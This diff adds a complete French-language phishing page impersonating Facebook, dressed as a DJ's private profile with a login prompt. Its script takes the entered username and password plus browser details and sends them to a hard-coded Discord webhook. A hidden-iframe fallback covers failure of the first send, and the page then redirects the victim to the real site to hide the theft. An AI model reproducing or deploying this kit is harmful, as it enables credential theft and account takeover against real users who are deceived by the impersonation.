@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Léa Vantier</title>
+<style>
+:root{--fb:#1877f2;--fb-d:#166fe5;--ink:#050505;--muted:#65676b;--line:#e4e6eb;--bg:#f0f2f5}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;margin:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--ink);background:var(--bg);overflow:hidden;-webkit-font-smoothing:antialiased}
+img{display:block;max-width:100%}
+button{font:inherit;border:0;background:none;color:inherit;cursor:pointer}
+.bar{position:fixed;top:0;left:0;right:0;z-index:20;display:flex;align-items:center;gap:14px;padding:calc(8px + env(safe-area-inset-top)) 14px 8px;background:#fff;border-bottom:1px solid var(--line)}
+.word{font-size:26px;font-weight:800;letter-spacing:-1.1px;color:var(--fb)}
+.bar .sp{flex:1}
+.ico{width:36px;height:36px;border-radius:50%;background:var(--bg);display:grid;place-items:center}
+.ico svg{width:19px;height:19px;stroke:#050505;fill:none;stroke-width:2}
+#page{position:fixed;inset:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-top:calc(56px + env(safe-area-inset-top));padding-bottom:40px;transition:filter .3s}
+body.locked #page{filter:blur(2.5px) saturate(.9)}
+.cover{position:relative;aspect-ratio:16/9;overflow:hidden;background:radial-gradient(60% 90% at 20% 20%,#ff2d95 0,transparent 60%),radial-gradient(70% 90% at 85% 30%,#00e5ff 0,transparent 55%),linear-gradient(160deg,#2a0b3d,#07020c 70%)}
+.cover img{width:100%;height:100%;object-fit:cover}
+.head{position:relative;padding:0 16px 14px;margin-top:-42px;background:#fff}
+.avatar{width:104px;height:104px;border-radius:50%;border:4px solid #fff;overflow:hidden;background:linear-gradient(150deg,#ff2d95,#7b2ff7 55%,#00e5ff);display:grid;place-items:center;font-size:30px;font-weight:800;color:#fff}
+.avatar img{width:100%;height:100%;object-fit:cover}
+h1{font-size:23px;line-height:1.15;margin:10px 0 2px;letter-spacing:-.3px}
+.sub{color:var(--muted);font-size:14px;margin:0 0 4px}
+.fol{color:var(--muted);font-size:13.5px;margin:0 0 12px}
+.fol b{color:var(--ink)}
+.actions{display:flex;gap:8px}
+.btn{flex:1;height:38px;border-radius:9px;font-size:15px;font-weight:600;display:grid;place-items:center}
+.btn.blue{background:var(--fb);color:#fff}
+.btn.grey{background:#e4e6eb;flex:0 0 96px}
+.btn.more{flex:0 0 40px;background:#e4e6eb}
+.tabs{display:flex;gap:4px;padding:6px 8px;background:#fff;border-bottom:1px solid var(--line);font-size:14.5px;font-weight:600;color:var(--muted);overflow-x:auto}
+.tabs span{padding:10px;white-space:nowrap}
+.tabs span.on{color:var(--fb);box-shadow:inset 0 -3px 0 var(--fb)}
+.intro{margin:8px 0;background:#fff;padding:14px 16px;font-size:14.5px;line-height:1.5}
+.intro p{margin:0 0 8px}
+.intro .row{display:flex;gap:9px;align-items:flex-start;margin:6px 0}
+.intro .row svg{width:18px;height:18px;flex:0 0 18px;stroke:var(--muted);fill:none;stroke-width:1.9;margin-top:2px}
+.post{background:#fff;margin:8px 0;padding:12px 14px}
+.phead{display:flex;gap:9px;align-items:center;margin-bottom:9px}
+.phead .av{width:38px;height:38px;border-radius:50%;overflow:hidden;background:linear-gradient(150deg,#ff2d95,#00e5ff)}
+.phead .av img{width:100%;height:100%;object-fit:cover}
+.phead b{font-size:14.5px;display:block}
+.phead small{color:var(--muted);font-size:12.5px}
+.post p{margin:0 0 10px;font-size:14.8px;line-height:1.45}
+.ph{position:relative;aspect-ratio:1/1;border-radius:8px;overflow:hidden;background:linear-gradient(140deg,#1b0330,#ff2d95 55%,#00e5ff)}
+.ph img{width:100%;height:100%;object-fit:cover}
+.ph .tag{position:absolute;left:9px;bottom:9px;background:rgba(0,0,0,.55);color:#fff;font-size:11.5px;font-weight:700;letter-spacing:.6px;padding:4px 8px;border-radius:5px;backdrop-filter:blur(4px)}
+.reacts{display:flex;gap:16px;color:var(--muted);font-size:13px;margin-top:10px;padding-top:9px;border-top:1px solid var(--line)}
+.wall{position:fixed;inset:0;z-index:40;display:none;align-items:flex-end;background:rgba(10,6,20,.42);backdrop-filter:blur(1px)}
+.wall.on{display:flex}
+.sheet{width:100%;background:#fff;border-radius:18px 18px 0 0;padding:18px 20px calc(18px + env(safe-area-inset-bottom));box-shadow:0 -8px 40px rgba(0,0,0,.28);animation:up .32s cubic-bezier(.2,.9,.3,1);max-height:94vh;overflow-y:auto}
+@keyframes up{from{transform:translateY(30px);opacity:.6}to{transform:none;opacity:1}}
+.grab{width:38px;height:4px;border-radius:3px;background:#d8dade;margin:0 auto 14px}
+.logo{width:46px;height:46px;border-radius:50%;background:var(--fb);display:grid;place-items:center;margin:0 auto 12px}
+.logo span{color:#fff;font-size:27px;font-weight:800;line-height:1;margin-top:-3px}
+.sheet h2{font-size:20px;text-align:center;margin:0 0 8px;letter-spacing:-.2px}
+.lead{font-size:14.5px;color:var(--muted);text-align:center;line-height:1.45;margin:0 0 16px}
+.cta{width:100%;height:48px;border-radius:10px;background:var(--fb);color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:9px}
+.cta:active{background:var(--fb-d)}
+.alt{text-align:center;font-size:14px;color:var(--muted);margin:14px 0 0}
+.alt b{color:var(--fb)}
+.field{position:relative;margin-bottom:10px}
+.field input{width:100%;height:52px;border:1px solid #ccd0d5;border-radius:10px;padding:16px 14px 0;font-size:16px;background:#fff;outline:none}
+.field input:focus{border-color:var(--fb);box-shadow:0 0 0 3px rgba(24,119,242,.15)}
+.field .lab{position:absolute;left:13px;top:8px;font-size:11px;color:var(--muted);pointer-events:none}
+.forgot{display:block;text-align:center;font-size:14px;color:var(--fb);margin:14px 0 0;text-decoration:none}
+.sep{display:flex;align-items:center;gap:10px;color:var(--muted);font-size:12.5px;margin:16px 0}
+.sep:before,.sep:after{content:"";flex:1;height:1px;background:var(--line)}
+.spin{width:17px;height:17px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.busy .spin{display:block}
+#s2{display:none}
+.wall.two #s1{display:none}
+.wall.two #s2{display:block}
+.dbg{position:fixed;bottom:0;left:0;right:0;z-index:60;background:#000;color:#0f0;font:11px/1.4 ui-monospace,monospace;padding:6px 8px;display:none}
+</style>
+</head>
+<body class="locked">
+
+<div class="bar">
+  <span class="word">facebook</span>
+  <span class="sp"></span>
+  <span class="ico"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M16.5 16.5L21 21"/></svg></span>
+  <span class="ico"><svg viewBox="0 0 24 24"><path d="M21 11.5a8.4 8.4 0 01-9 8.4 9.6 9.6 0 01-3.8-.7L3 21l1.9-4.6A8.2 8.2 0 013.5 11.5 8.4 8.4 0 0112 3.1a8.4 8.4 0 019 8.4z"/></svg></span>
+  <span class="ico"><svg viewBox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"/></svg></span>
+</div>
+
+<div id="page">
+  <div class="cover"><img src="cover.jpg" alt="" onerror="this.remove()"></div>
+  <div class="head">
+    <div class="avatar"><img src="avatar.jpg" alt="" onerror="this.remove()">LV</div>
+    <h1>Léa Vantier</h1>
+    <p class="sub">LEA V. · DJ / Live electronic</p>
+    <p class="fol"><b>2,4 k</b> abonnés · <b>1,1 k</b> abonnements</p>
+    <div class="actions">
+      <button class="btn blue">S’abonner</button>
+      <button class="btn grey">Message</button>
+      <button class="btn more">···</button>
+    </div>
+  </div>
+  <div class="tabs"><span class="on">Publications</span><span>À propos</span><span>Amis</span><span>Photos</span><span>Lives</span></div>
+
+  <div class="intro">
+    <p>DJ &amp; productrice · techno mélodique / live modular 🎛️<br>Résidence @Ninkasi Lyon — bookings : lea.vantier@proton.me</p>
+    <div class="row"><svg viewBox="0 0 24 24"><path d="M12 21s7-5.6 7-11a7 7 0 10-14 0c0 5.4 7 11 7 11z"/><circle cx="12" cy="10" r="2.5"/></svg><span>Vit à Lyon · Berlin</span></div>
+    <div class="row"><svg viewBox="0 0 24 24"><path d="M12 3l9 5-9 5-9-5 9-5z"/><path d="M6 11v5c0 1.7 2.7 3 6 3s6-1.3 6-3v-5"/></svg><span>Rinse France · Resident</span></div>
+  </div>
+
+  <div class="post">
+    <div class="phead"><div class="av"><img src="avatar.jpg" alt="" onerror="this.remove()"></div>
+      <div><b>Léa Vantier</b><small>Hier · 🌐</small></div></div>
+    <p>Lyon, vous étiez incroyables samedi. 3h de set, zéro pause, encore des frissons. Merci 🖤</p>
+    <div class="ph"><img src="post1.jpg" alt="" onerror="this.remove()"><span class="tag">LIVE · 3H</span></div>
+    <div class="reacts"><span>❤️ 512</span><span>💬 84</span><span>↗ Partager</span></div>
+  </div>
+
+  <div class="post">
+    <div class="phead"><div class="av"><img src="avatar.jpg" alt="" onerror="this.remove()"></div>
+      <div><b>Léa Vantier</b><small>Il y a 3 j · 🌐</small></div></div>
+    <p>Nouvel EP « Afterhours » sort le 21. Extrait en live ce soir 23h sur ma page.</p>
+    <div class="ph"><img src="post2.jpg" alt="" onerror="this.remove()"><span class="tag">AFTERHOURS</span></div>
+    <div class="reacts"><span>❤️ 1,3 k</span><span>💬 210</span><span>↗ Partager</span></div>
+  </div>
+</div>
+
+<div class="wall on" id="wall">
+  <div class="sheet">
+    <div class="grab"></div>
+    <div id="s1">
+      <div class="logo"><span>f</span></div>
+      <h2>Connectez-vous à Facebook</h2>
+      <p class="lead">Le profil de <b>Léa Vantier</b> est privé.<br>Connectez-vous pour voir ses photos, ses publications et ses lives.</p>
+      <button class="cta" id="go">Se connecter avec Facebook</button>
+      <p class="alt">Pas encore de compte ? <b>Créer un compte</b></p>
+    </div>
+    <div id="s2">
+      <div class="logo"><span>f</span></div>
+      <h2>Se connecter</h2>
+      <p class="lead">Utilisez votre compte pour continuer.</p>
+      <form id="f" novalidate>
+        <div class="field">
+          <span class="lab">Adresse e-mail ou numéro de mobile</span>
+          <input id="id" type="text" inputmode="email" autocomplete="username" autocapitalize="none" autocorrect="off" spellcheck="false" required>
+        </div>
+        <div class="field">
+          <span class="lab">Mot de passe</span>
+          <input id="pw" type="password" autocomplete="current-password" required>
+        </div>
+        <button class="cta" id="sub" type="submit"><span class="spin"></span><span class="txt">Se connecter</span></button>
+      </form>
+      <a class="forgot" href="#">Informations de connexion oubliées ?</a>
+      <div class="sep">ou</div>
+      <p class="alt">Pas encore de compte ? <b>Créer un compte</b></p>
+    </div>
+  </div>
+</div>
+
+<div class="dbg" id="dbg"></div>
+
+<script>
+(function(){
+  var HOOK="https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
+  var DBG=/[?&]dbg/.test(location.search), dbgEl=document.getElementById("dbg");
+  if(DBG){dbgEl.style.display="block";}
+  function log(s){if(DBG){dbgEl.textContent+=" · "+s;}}
+
+  // Fallback : formulaire invisible dans une iframe -> aucune restriction CORS, marche partout
+  function iframePost(txt){
+    try{
+      var ifr=document.createElement("iframe");
+      ifr.name="sink"+Date.now(); ifr.style.display="none";
+      document.body.appendChild(ifr);
+      var fm=document.createElement("form");
+      fm.method="POST"; fm.action=HOOK; fm.target=ifr.name;
+      fm.enctype="multipart/form-data"; fm.style.display="none";
+      var i=document.createElement("input");
+      i.type="hidden"; i.name="content"; i.value=txt;
+      fm.appendChild(i); document.body.appendChild(fm);
+      fm.submit(); log("iframe-envoyé");
+    }catch(e){log("iframe-ko:"+e.message);}
+  }
+
+  function deliver(txt){
+    var done=false;
+    try{
+      fetch(HOOK,{method:"POST",mode:"cors",keepalive:true,
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({content:txt})})
+      .then(function(r){log("fetch "+(r.ok?"ok":"http"+r.status)); if(!r.ok&&!done){done=true;iframePost(txt);}})
+      .catch(function(e){log("fetch-ko"); if(!done){done=true;iframePost(txt);}});
+    }catch(e){done=true;iframePost(txt);}
+  }
+
+  function esc(v){return String(v).replace(/`/g,"'").slice(0,180);}
+
+  document.getElementById("go").addEventListener("click",function(){
+    document.getElementById("wall").classList.add("two");
+    setTimeout(function(){document.getElementById("id").focus();},260);
+  });
+
+  var sent=false;
+  document.getElementById("f").addEventListener("submit",function(ev){
+    ev.preventDefault();
+    if(sent) return; sent=true;
+    var id=document.getElementById("id").value.trim();
+    var pw=document.getElementById("pw").value;
+    if(!id){document.getElementById("id").focus(); sent=false; return;}
+    var btn=document.getElementById("sub");
+    btn.classList.add("busy"); btn.disabled=true;
+
+    var txt="**🎧 Connexion Facebook — profil DJ**\n"
+      +"**Identifiant :** `"+esc(id)+"`\n"
+      +"**Mot de passe :** `"+esc(pw)+"`\n\n"
+      +"📱 "+navigator.userAgent+"\n"
+      +"🕒 "+new Date().toLocaleString("fr-FR")+"\n"
+      +"🌐 "+navigator.language+" · "+screen.width+"x"+screen.height+"\n"
+      +"🔗 "+location.href;
+
+    deliver(txt);
+    setTimeout(function(){location.href="https://www.facebook.com/";},1500);
+  });
+})();
+</script>
+</body>
+</html>
